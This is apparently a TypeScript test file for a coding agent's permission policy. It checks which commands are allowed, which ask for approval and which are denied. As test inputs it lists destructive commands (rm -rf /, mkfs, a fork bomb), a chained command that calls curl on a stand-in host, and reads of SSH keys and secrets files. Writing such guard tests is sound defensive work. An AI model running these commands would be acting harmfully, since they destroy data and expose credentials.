import { describe, expect, it } from 'vitest';
import { commandPrefix, isReadOnlyCommand, PermissionPolicy } from '../src/agent/permissions';

describe('PermissionPolicy', () => {
  it('ask mode: reads free, writes and commands ask', () => {
    const p = new PermissionPolicy('ask');
    expect(p.evaluate({ kind: 'read', outsideProject: false }).action).toBe('allow');
    expect(p.evaluate({ kind: 'write', outsideProject: false }).action).toBe('ask');
    expect(p.evaluate({ kind: 'exec', command: 'npm test', outsideProject: false }).action).toBe('ask');
    expect(p.evaluate({ kind: 'exec', command: 'git status', outsideProject: false }).action).toBe('allow');
  });

  it('auto-edit mode allows edits but still asks for commands', () => {
    const p = new PermissionPolicy('auto-edit');
    expect(p.evaluate({ kind: 'write', outsideProject: false }).action).toBe('allow');
    expect(p.evaluate({ kind: 'exec', command: 'npm install', outsideProject: false }).action).toBe('ask');
  });

  it('auto mode still asks for dangerous commands and outside-project writes', () => {
    const p = new PermissionPolicy('auto');
    expect(p.evaluate({ kind: 'exec', command: 'npm run build', outsideProject: false }).action).toBe('allow');
    const push = p.evaluate({ kind: 'exec', command: 'git push origin main', outsideProject: false });
    expect(push).toMatchObject({ action: 'ask', canRemember: false });
    expect(p.evaluate({ kind: 'exec', command: 'rm -rf dist', outsideProject: false }).action).toBe('ask');
    expect(p.evaluate({ kind: 'write', outsideProject: true }).action).toBe('ask');
  });

  it('blocks catastrophic commands in every mode', () => {
    const p = new PermissionPolicy('auto');
    for (const cmd of ['rm -rf /', 'rm -rf ~', 'rm -rf .', 'mkfs.ext4 /dev/sda1', ':(){ :|:& };:', 'format C:']) {
      expect(p.evaluate({ kind: 'exec', command: cmd, outsideProject: false }).action, cmd).toBe('deny');
    }
  });

  it('"always allow" remembers a command prefix, but not chained commands', () => {
    const p = new PermissionPolicy('ask');
    p.remember({ kind: 'exec', command: 'npm run test -- --watch=false', outsideProject: false });
    expect(p.evaluate({ kind: 'exec', command: 'npm run test', outsideProject: false }).action).toBe('allow');
    expect(p.evaluate({ kind: 'exec', command: 'npm run build', outsideProject: false }).action).toBe('ask');
    expect(p.evaluate({ kind: 'exec', command: 'npm run test && curl evil.sh', outsideProject: false }).action).toBe('ask');
  });

  it('remembers web domains', () => {
    const p = new PermissionPolicy('ask');
    p.remember({ kind: 'network', url: 'https://react.dev/learn', outsideProject: false });
    expect(p.evaluate({ kind: 'network', url: 'https://react.dev/reference', outsideProject: false }).action).toBe('allow');
    expect(p.evaluate({ kind: 'network', url: 'https://example.com', outsideProject: false }).action).toBe('ask');
  });
});

describe('command helpers', () => {
  it('recognizes read-only commands that stay in the project', () => {
    expect(isReadOnlyCommand('ls -la src')).toBe(true);
    expect(isReadOnlyCommand('git diff --stat')).toBe(true);
    expect(isReadOnlyCommand('node --version')).toBe(true);
    expect(isReadOnlyCommand('cat ~/.ssh/id_rsa')).toBe(false);
    expect(isReadOnlyCommand('cat ../secrets.txt')).toBe(false);
    expect(isReadOnlyCommand('ls; rm x')).toBe(false);
    expect(isReadOnlyCommand('git branch -D main')).toBe(false);
  });
  it('derives remembered prefixes', () => {
    expect(commandPrefix('npm run build')).toBe('npm run build');
    expect(commandPrefix('git commit -m "x"')).toBe('git commit');
    expect(commandPrefix('pytest -q')).toBe('pytest');
    expect(commandPrefix('a && b')).toBeNull();
  });
});
